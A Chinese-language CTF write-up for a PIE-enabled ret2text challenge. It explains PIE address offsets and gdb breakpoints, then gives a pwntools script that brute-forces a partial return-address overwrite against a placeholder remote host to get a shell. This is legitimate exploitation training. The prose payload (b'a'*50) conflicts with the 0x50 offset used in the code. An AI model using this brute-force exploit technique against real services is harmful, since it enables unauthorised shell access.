  • 使用checksec检查一下都开启什么保护

  • 特征
    开启pie保护后.text段的地址只剩下最后的四个数字这个地址并不是程序实际的运行地址，而是与程序加载基址之间的偏移量。如果没有开启pie保护，程序的加载基址默认是0x400000，现在开启了pie保护后每次运行程序的加载基址都是不同的。
    程序的实际运行地址 = 程序加载基址 + 程序偏移地址

  • 开启pie保护的调试如何进行
    可以通过b *$rebase(0x13F9) 方式下断点。括号里面的是ida中反汇编出来的程序地址偏移量，需要注意的是在下断点调试之前，程序要先执行一次

这里开启了PIE 查阅资料得知可以用爆破ASLR覆盖的后几位

  • 上IDA

    看到可以函数跟进一下

    可以看到开启PIE后只有后三位是知道的

    在main中看到了vuln函数跟进去看一下

    漏洞函数read
    同时可以看到相对于rbp偏移了0x50即我们要填充80个垃圾字符才能到rbp
    所以payload = b’a’*50 + b’b’*8 + backdoor_addr
    这里的backdoor_addr需要爆破倒数第四位因为我们已经知道PIE开启后后三位是不受影响的只需要爆破第四位就行了

#!/usr/bin/python  
# coding:utf-8  
  
from pwn import *  
import time  
  
context(log_level='debug', arch='amd64', os='linux')  
i = 0  
list1 = ['\x02', '\x12', '\x22', '\x32', '\x42', '\x52', '\x62', '\x72', '\x82', '\x92', '\xa2', '\xb2', '\xc2', '\xd2', '\xe2', '\xf2']  
  
while True:  
    i += 1  
    print(i)  
    io = remote("xxx.xxx.xxx", xxx)  
    time.sleep(3)  
    # io = process('./ret2text')  
  
    payload = 'a' * 0x50 + "bbbbbbbb" + '\x27' + random.sample(list1, 1)[0]  
    dem = b'The simplest but not too simple pwn\n'  
    time.sleep(3)  
    io.recv()  
    time.sleep(1)  
    io.send(payload)  
    try:  
        io.recv(timeout=3)  # 要么崩溃要么爆破成功，若崩溃io会关闭，io.recv()会触发EOFError  
    except EOFError:  
        io.close()  
        continue  
    else:  
        sleep(3)  
        io.interactive()  # 没有EOFError的话就是爆破成功，可以开shell  
        break
